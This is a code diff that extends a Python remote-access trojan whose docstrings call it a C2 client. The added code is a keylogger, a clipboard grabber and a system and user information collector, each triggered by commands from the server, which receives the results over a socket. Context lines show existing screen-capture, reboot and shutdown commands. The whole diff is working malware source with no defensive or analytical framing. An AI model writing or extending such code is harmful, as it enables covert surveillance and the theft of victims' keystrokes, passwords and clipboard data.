@@ -5,6 +5,14 @@ import pyautogui
 import time
 import shutil
 import ctypes
+import platform
+import getpass
+import clipboard
+from pynput import keyboard
+
+# Global variable to store key logs
+key_logs = []
+key_logging = False
 
 def send_screenshare(client_socket):
     """Capture and send screen to the C2 server."""
@@ -54,6 +62,66 @@ def shutdown_system():
     else:
         subprocess.call(["sudo", "shutdown", "now"])
 
+def get_pc_info():
+    """Retrieve system information."""
+    info = {
+        "OS": platform.system(),
+        "OS Version": platform.version(),
+        "OS Release": platform.release(),
+        "Architecture": platform.architecture(),
+        "Machine": platform.machine(),
+        "Processor": platform.processor(),
+        "Hostname": socket.gethostname()
+    }
+    return "\n".join(f"{key}: {value}" for key, value in info.items())
+
+def get_user_info():
+    """Retrieve current user and domain information."""
+    user = getpass.getuser()
+    domain = os.getenv("USERDOMAIN", "N/A")  # Domain might not always be available
+    return f"User: {user}\nDomain: {domain}"
+
+def get_clipboard_content():
+    """Retrieve clipboard content."""
+    try:
+        content = clipboard.paste()
+        return f"Clipboard Content: {content}"
+    except Exception as e:
+        return f"Error accessing clipboard: {e}"
+
+def start_keylogger():
+    """Start key logging."""
+    global key_logging, key_logs
+    key_logging = True
+    key_logs = []
+
+    def on_press(key):
+        global key_logs, key_logging
+        if not key_logging:
+            return False  # Stop the listener
+        try:
+            if key == keyboard.Key.enter:
+                key_logs.append("[ENTER]")
+            elif hasattr(key, 'char') and key.char:  # Only capture printable characters
+                key_logs.append(key.char)
+        except AttributeError:
+            # Ignore special keys like caps lock, num lock, etc.
+            pass
+
+    # Start listener in a separate thread
+    listener = keyboard.Listener(on_press=on_press)
+    listener.start()
+
+def stop_keylogger():
+    """Stop key logging."""
+    global key_logging
+    key_logging = False
+
+def dump_keylogs():
+    """Dump logged keys."""
+    global key_logs
+    return "".join(key_logs)
+
 # Main client loop
 def client_loop(server_ip, server_port):
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -99,6 +167,20 @@ def client_loop(server_ip, server_port):
                 reboot_system()
             elif command.lower() == "shutdown":
                 shutdown_system()
+            elif command.lower() == "pcinfo":
+                client.send(get_pc_info().encode())
+            elif command.lower() == "identify":
+                client.send(get_user_info().encode())
+            elif command.lower() == "clipboard":
+                client.send(get_clipboard_content().encode())
+            elif command.lower() == "keymon set on":
+                start_keylogger()
+                client.send(b"Keylogger started.")
+            elif command.lower() == "keymon set off":
+                stop_keylogger()
+                client.send(b"Keylogger stopped.")
+            elif command.lower() == "keymon dump":
+                client.send(dump_keylogs().encode())
             elif command.lower() == "help":
                 help_text = """
 Available Commands:
@@ -113,6 +195,12 @@ Available Commands:
 - reboot: Reboot the client system.
 - shutdown: Shut down the client system.
 - screenshare: Start a live screen-sharing session.
+- pcinfo: Get system information.
+- identify: Get current user and domain.
+- clipboard: View clipboard content.
+- keymon set on: Start keylogger monitoring.
+- keymon set off: Stop keylogger monitoring.
+- keymon dump: Dump key logs.
 - help: Show this help text.
 """
                 client.send(help_text.encode())
